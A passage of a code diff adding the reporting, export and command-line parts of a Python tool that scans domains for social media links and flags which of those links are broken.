+            safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[INF] Active links: {len(active_links)}{Fore.RESET}{Style.RESET_ALL}")
+            safe_print(f"{Style.BRIGHT}{Fore.RED}[INF] Broken links: {len(broken_links)}{Fore.RESET}{Style.RESET_ALL}")
+        
+        self.broken_links = broken_links
+        self.active_links = active_links
+        
+        return broken_links, active_links
+
+    def export_broken_links(self, filename="broken_links.txt"):       
+        if not hasattr(self, 'broken_links'):
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.YELLOW}[WRN] No broken links data. Run check_broken_links() first.{Fore.RESET}{Style.RESET_ALL}")
+            return
+        
+        if not self.broken_links:
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[INF] No broken links found{Fore.RESET}{Style.RESET_ALL}")
+            return
+        
+        try:
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write("="*70 + "\n")
+                f.write("BROKEN SOCIAL MEDIA LINKS REPORT\n")
+                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("="*70 + "\n\n")
+                f.write(f"Total broken links: {len(self.broken_links)}\n\n")
+                
+                platform_groups = {}
+                for link in self.broken_links:
+                    platform = link['platform'].upper()
+                    if platform not in platform_groups:
+                        platform_groups[platform] = []
+                    platform_groups[platform].append(link)
+                
+                for platform, links in sorted(platform_groups.items()):
+                    f.write(f"\n[{platform}] ({len(links)} broken links)\n")
+                    f.write("-"*50 + "\n")
+                    for link in links:
+                        f.write(f"  URL: {link['url']}\n")
+                        f.write(f"  Source: {link['source']}\n")
+                        f.write(f"  Reason: {link['detail']}\n\n")
+            
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[INF] Broken links saved to: {filename}{Fore.RESET}{Style.RESET_ALL}")
+            
+        except Exception as e:
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] Export broken links: {e}{Fore.RESET}{Style.RESET_ALL}")
+    
+    def export_json(self, filename):
+        try:
+            data = {
+                'timestamp': datetime.now().isoformat(),
+                'total_domains': len(self.results),
+                'total_found': self.total_found,
+                'stats': self.stats,
+                'results': self.results,
+                'broken_links': self.broken_links if hasattr(self, 'broken_links') else [],
+                'active_links': self.active_links if hasattr(self, 'active_links') else []
+            }
+            with open(filename, 'w', encoding='utf-8') as f:
+                json.dump(data, f, indent=2, ensure_ascii=False)
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[INF] Exported to JSON: {filename}{Fore.RESET}{Style.RESET_ALL}")
+            return True
+        except Exception as e:
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] Export JSON: {e}{Fore.RESET}{Style.RESET_ALL}")
+            return False
+    
+    def export_csv(self, filename):
+        try:
+            found_links = [r for r in self.results if r.get('link') and r['link'] not in ['Not Found', 'Error']]
+            
+            if not found_links:
+                if not self.quiet:
+                    safe_print(f"\n{Style.BRIGHT}{Fore.YELLOW}[WRN] No links to export to CSV{Fore.RESET}{Style.RESET_ALL}")
+                return False
+            
+            with open(filename, 'w', newline='', encoding='utf-8') as f:
+                writer = csv.writer(f)
+                writer.writerow(['Status', 'Website', 'Platform', 'Link', 'Server', 'Response Time', 'Broken Status'])
+                
+                for result in found_links:
+                    broken_status = 'BROKEN' if any(b['url'] == result['link'] for b in self.broken_links) else 'ACTIVE'
+                    writer.writerow([
+                        result.get('status', ''),
+                        result.get('website', ''),
+                        result.get('platform', ''),
+                        result.get('link', ''),
+                        result.get('server', ''),
+                        f"{result.get('response_time', 0):.2f}s",
+                        broken_status
+                    ])
+            
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[INF] Exported to CSV: {filename}{Fore.RESET}{Style.RESET_ALL}")
+            return True
+        except Exception as e:
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] Export CSV: {e}{Fore.RESET}{Style.RESET_ALL}")
+            return False
+    
+    def save_to_database(self):
+        try:
+            self.db.save_scan(self.results)
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[INF] Saved to database{Fore.RESET}{Style.RESET_ALL}")
+        except Exception as e:
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] Save to database: {e}{Fore.RESET}{Style.RESET_ALL}")
+    
+    def print_summary(self):
+        if self.quiet:
+            return
+        
+        safe_print(f"\n{Style.BRIGHT}{Fore.CYAN}[INF] Summary Report{Fore.RESET}{Style.RESET_ALL}")
+        safe_print(f"{Style.BRIGHT}{Fore.CYAN}[INF] Total Domains: {len(self.results)}{Fore.RESET}{Style.RESET_ALL}")
+        safe_print(f"{Style.BRIGHT}{Fore.CYAN}[INF] Total Links Found: {self.total_found}{Fore.RESET}{Style.RESET_ALL}")
+        
+        if self.stats:
+            safe_print(f"{Style.BRIGHT}{Fore.CYAN}[INF] Platform Statistics:{Fore.RESET}{Style.RESET_ALL}")
+            for platform, count in sorted(self.stats.items(), key=lambda x: x[1], reverse=True):
+                platform_color = self.get_platform_color(platform)
+                safe_print(f"{Style.BRIGHT}{platform_color}       {platform.upper()}: {count}{Fore.RESET}{Style.RESET_ALL}")
+        
+        found_links = [r for r in self.results if r.get('link') and r['link'] not in ['Not Found', 'Error']]
+        
+        if found_links:
+            safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[RES] Found Links:{Fore.RESET}{Style.RESET_ALL}")
+            for result in found_links:
+                platform_color = self.get_platform_color(result.get('platform', ''))
+                is_broken = any(b['url'] == result['link'] for b in self.broken_links) if hasattr(self, 'broken_links') else False 
+                
+                if is_broken:
+                    safe_print(f"{Style.BRIGHT}{platform_color}[BROKEN-{result.get('platform', '').upper()}] {result['link']} -> {result['website']} [{result['status']}]{Fore.RESET}{Style.RESET_ALL}")
+                else:
+                    safe_print(f"{Style.BRIGHT}{platform_color}[ACTIVE-{result.get('platform', '').upper()}] {result['link']} -> {result['website']} [{result['status']}]{Fore.RESET}{Style.RESET_ALL}")
+        else:
+            safe_print(f"\n{Style.BRIGHT}{Fore.YELLOW}[WRN] No social media links found{Fore.RESET}{Style.RESET_ALL}")
+    
+    def save_results(self, filename="results.txt"):
+        if not self.results:
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.YELLOW}[!] No results to save{Fore.RESET}{Style.RESET_ALL}")
+            return
+        
+        try:
+            found_links = [r for r in self.results if r.get('link') and r['link'] not in ['Not Found', 'Error']]
+            
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write("# SOCMED Checker Results\n")
+                f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write("# " + "="*60 + "\n\n")
+                f.write(f"Total Domains Checked: {len(self.results)}\n")
+                f.write(f"Total Links Found: {len(found_links)}\n")
+                
+                if self.stats:
+                    f.write("\nPlatform Statistics:\n")
+                    for platform, count in sorted(self.stats.items(), key=lambda x: x[1], reverse=True):
+                        f.write(f"  {platform.upper()}: {count}\n")
+                
+                f.write("\n" + "-"*60 + "\n\n")
+                
+                if found_links:
+                    f.write("FOUND SOCIAL MEDIA LINKS:\n")
+                    f.write("-"*40 + "\n")
+                    for result in found_links:
+                        is_broken = any(b['url'] == result['link'] for b in self.broken_links) if hasattr(self, 'broken_links') else False
+                        status = "BROKEN" if is_broken else "ACTIVE"
+                        f.write(f"[{result['status']}] {result['website']} [{result.get('platform', '').upper()}] {result['link']} [{status}]\n")
+                    f.write(f"\n# Total found: {len(found_links)}\n")
+                    
+                    if hasattr(self, 'broken_links') and self.broken_links:
+                        f.write(f"\n# Broken links: {len(self.broken_links)}\n")
+                        for link in self.broken_links:
+                            f.write(f"#   {link['url']} - {link['detail']}\n")
+                else:
+                    f.write("# No social media links found\n")
+            
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[INF] Results saved to: {filename}{Fore.RESET}{Style.RESET_ALL}")
+            
+            self.save_to_database()
+            
+        except Exception as e:
+            if not self.quiet:
+                safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] Saving results: {e}{Fore.RESET}{Style.RESET_ALL}")
+
+def load_domains(filename):
+    try:
+        with open(filename, 'r', encoding='utf-8') as f:
+            domains = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        return domains
+    except FileNotFoundError:
+        safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] File {filename} not found!{Fore.RESET}{Style.RESET_ALL}")
+        sys.exit(1)
+    except Exception as e:
+        safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] Loading file: {e}{Fore.RESET}{Style.RESET_ALL}")
+        sys.exit(1)
+
+def test_colors():
+    safe_print(f"\n{Style.BRIGHT}{Fore.CYAN}Testing color support...{Style.RESET_ALL}")
+    
+    if ColorUtils.supports_true_color():
+        safe_print(f"{Style.BRIGHT}{Fore.GREEN}✓ True color supported{Style.RESET_ALL}")
+        
+        test_colors = ['#FF0000', '#00FF00', '#0000FF', '#FF00FF', '#FFFF00', '#00FFFF', '#FF6B6B', '#4ECDC4']
+        safe_print(f"{Style.BRIGHT}{Fore.CYAN}Testing hex colors:{Style.RESET_ALL}")
+        for hex_color in test_colors:
+            ansi = ColorUtils.hex_to_ansi(hex_color)
+            if ansi:
+                rgb = ColorUtils.hex_to_rgb(hex_color)
+                safe_print(f"{ansi}████ {hex_color} RGB{rgb}{Style.RESET_ALL}")
+    else:
+        safe_print(f"{Style.BRIGHT}{Fore.YELLOW}⚠ True color not supported, using 256 color mode{Style.RESET_ALL}")
+        
+    try:
+        import subprocess
+        result = subprocess.run(['tput', 'colors'], capture_output=True, text=True)
+        if result.returncode == 0:
+            colors = int(result.stdout.strip())
+            safe_print(f"{Style.BRIGHT}{Fore.GREEN}✓ {colors} colors available{Style.RESET_ALL}")
+    except:
+        pass
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='SOCMED - Social Media Link Finder',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python socmed.py -l domains.txt -all
+  python socmed.py -l domains.txt -ig -tele -yt -v
+  python socmed.py -l domains.txt -custom custom.yaml -o results.json --json
+  python socmed.py -l domains.txt -config config.yaml -all
+  python socmed.py -l domains.txt --history
+
+Platforms:
+  -ig    Instagram    -tele  Telegram    -yt    YouTube
+  -tt    TikTok       -tw    Twitter     -fb    Facebook
+  -in    LinkedIn     -gh    GitHub      -rd    Reddit
+  -dc    Discord      -sp    Spotify     -md    Medium
+  -tc    Twitch       -all   All Platforms
+        """
+    )
+    parser.add_argument('-l', '--list', help='File containing list of domains/subdomains')
+    parser.add_argument('-o', '--output', help='Output file for results')
+    parser.add_argument('-config', '--config', help='Configuration file (YAML)')
+    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds')
+    parser.add_argument('-w', '--workers', type=int, default=20, help='Number of concurrent workers')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')
+    parser.add_argument('--quiet', action='store_true', help='Quiet mode - hide errors and progress')
+    parser.add_argument('--test-colors', action='store_true', help='Test terminal color support')
+    
+    parser.add_argument('--json', action='store_true', help='Export results to JSON')
+    parser.add_argument('--csv', action='store_true', help='Export results to CSV')
+    parser.add_argument('--db', action='store_true', help='Save results to database')
+    parser.add_argument('--history', action='store_true', help='Show scan history')
+    
+    platform_group = parser.add_argument_group('Platforms')
+    platform_group.add_argument('-ig', '--instagram', action='store_true', help='Check Instagram')
+    platform_group.add_argument('-tele', '--telegram', action='store_true', help='Check Telegram')
+    platform_group.add_argument('-yt', '--youtube', action='store_true', help='Check YouTube')
+    platform_group.add_argument('-tt', '--tiktok', action='store_true', help='Check TikTok')
+    platform_group.add_argument('-tw', '--twitter', action='store_true', help='Check Twitter/X')
+    platform_group.add_argument('-fb', '--facebook', action='store_true', help='Check Facebook')
+    platform_group.add_argument('-in', '--linkedin', action='store_true', help='Check LinkedIn')
+    platform_group.add_argument('-gh', '--github', action='store_true', help='Check GitHub')
+    platform_group.add_argument('-rd', '--reddit', action='store_true', help='Check Reddit')
+    platform_group.add_argument('-dc', '--discord', action='store_true', help='Check Discord')
+    platform_group.add_argument('-sp', '--spotify', action='store_true', help='Check Spotify')
+    platform_group.add_argument('-md', '--medium', action='store_true', help='Check Medium')
+    platform_group.add_argument('-tc', '--twitch', action='store_true', help='Check Twitch')
+    platform_group.add_argument('-all', '--all', action='store_true', help='Check all platforms')
+    
+    parser.add_argument('-custom', '--custom-method', help='Custom YAML file with rules')
+    parser.add_argument('--proxy', help='Proxy URL (e.g., http://user:pass@host:port)')
+    
+    args = parser.parse_args()
+    
+    if args.config:
+        if not os.path.exists(args.config):
+            safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] Config file not found: {args.config}{Fore.RESET}{Style.RESET_ALL}")
+            sys.exit(1)
+    
+    if args.history:
+        db = DatabaseManager('scans.db')
+        history = db.get_history(50)
+        safe_print(f"\n{Style.BRIGHT}{Fore.CYAN}Scan History:{Fore.RESET}{Style.RESET_ALL}")
+        safe_print("-" * 80)
+        if history:
+            for entry in history:
+                safe_print(f"{Style.BRIGHT}{Fore.GREEN}{entry[0]}{Fore.RESET} | {entry[1]} | {entry[2]} | {entry[3]} | {entry[4]}{Style.RESET_ALL}")
+        else:
+            safe_print(f"{Style.BRIGHT}{Fore.YELLOW}No history found. Run a scan first with -all option.{Fore.RESET}{Style.RESET_ALL}")
+        return
+    
+    if args.test_colors:
+        test_colors()
+        return
+    
+    print_banner()
+    
+    platform_flags = [
+        args.instagram, args.telegram, args.youtube, args.tiktok, 
+        args.twitter, args.facebook, args.linkedin, args.github,
+        args.reddit, args.discord, args.spotify, args.medium,
+        args.twitch, args.all
+    ]
+    
+    if not any(platform_flags):
+        if not args.quiet:
+            safe_print(f"\n{Style.BRIGHT}{Fore.YELLOW}[WRN] No platform specified. Auto-enabling -all mode{Fore.RESET}{Style.RESET_ALL}")
+        args.all = True
+    
+    platforms = {'all': args.all}
+    platform_names = ['instagram', 'telegram', 'youtube', 'tiktok', 'twitter', 
+                     'facebook', 'linkedin', 'github', 'reddit', 'discord',
+                     'spotify', 'medium', 'twitch']
+    
+    if args.all:
+        for p in platform_names:
+            platforms[p] = True
+    else:
+        for p in platform_names:
+            platforms[p] = getattr(args, p, False)
+    
+    if not args.list:
+        safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] No domain list provided. Use -l option{Fore.RESET}{Style.RESET_ALL}")
+        sys.exit(1)
+    
+    domains = load_domains(args.list)
+    if not args.quiet:
+        safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[INF] Loaded {len(domains)} domains from {args.list}{Fore.RESET}{Style.RESET_ALL}")
+    
+    checker = SocMedChecker(
+        timeout=args.timeout,
+        max_workers=args.workers,
+        verbose=args.verbose,
+        quiet=args.quiet
+    )
+    
+    if args.config:
+        if checker.load_config(args.config):
+            if not args.quiet:
+                safe_print(f"{Style.BRIGHT}{Fore.GREEN}[INF] Loaded config from {args.config}{Fore.RESET}{Style.RESET_ALL}")
+    
+    checker.platforms = platforms
+    
+    if args.custom_method:
+        if checker.load_custom_rules(args.custom_method):
+            if not args.quiet:
+                safe_print(f"{Style.BRIGHT}{Fore.GREEN}[INF] Loaded custom rules from {args.custom_method}{Fore.RESET}{Style.RESET_ALL}")
+            for rule in checker.custom_rules:
+                platform = rule.get('name', '').lower()
+                if platform:
+                    platforms[platform] = True
+                    color = rule.get('color', '')
+                    if color and color.startswith('#') and not args.quiet:
+                        rgb = ColorUtils.hex_to_rgb(color)
+                        if rgb:
+                            color_ansi = ColorUtils.hex_to_ansi(color)
+                            safe_print(f"{Style.BRIGHT}{Fore.CYAN}[INF] Custom platform '{platform}' using color {color_ansi}████{Style.RESET_ALL} {color} RGB{rgb}{Style.RESET_ALL}")
+    
+    if args.proxy:
+        checker.session.proxies.update({
+            'http': args.proxy,
+            'https': args.proxy
+        })
+        if not args.quiet:
+            safe_print(f"{Style.BRIGHT}{Fore.GREEN}[INF] Using proxy: {args.proxy}{Fore.RESET}{Style.RESET_ALL}")
+    
+    if not args.quiet:
+        enabled = [p for p, v in platforms.items() if v and p != 'all']
+        if enabled:
+            safe_print(f"{Style.BRIGHT}{Fore.CYAN}[INF] Platforms: {', '.join(enabled)}{Fore.RESET}{Style.RESET_ALL}")
+        if args.all:
+            safe_print(f"{Style.BRIGHT}{Fore.CYAN}[INF] Platforms: ALL{Fore.RESET}{Style.RESET_ALL}")
+    
+    start_time = time.time()
+    checker.process_domains(domains)
+    
+    checker.print_summary()
+    
+    if args.output:
+        base_name = os.path.splitext(args.output)[0]
+        
+        if args.json:
+            checker.export_json(f"{base_name}.json")
+        elif args.csv:
+            checker.export_csv(f"{base_name}.csv")
+        else:
+            checker.save_results(args.output)
+    else:
+        checker.save_results("url_results.txt")
+    
+    if args.json:
+        checker.export_json("results.json")
+    if args.csv:
+        checker.export_csv("results.csv")
+    if args.db:
+        checker.save_to_database()
+    
+    elapsed = time.time() - start_time
+    if not args.quiet:
+        safe_print(f"\n{Style.BRIGHT}{Fore.GREEN}[INF] Completed in {elapsed:.2f}s{Fore.RESET}{Style.RESET_ALL}")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        safe_print(f"\n{Style.BRIGHT}{Fore.YELLOW}[!] Process interrupted by user{Fore.RESET}{Style.RESET_ALL}")
+        sys.exit(0)
+    except Exception as e:
+        safe_print(f"\n{Style.BRIGHT}{Fore.RED}[ERR] {e}{Fore.RESET}{Style.RESET_ALL}")
+        sys.exit(1)
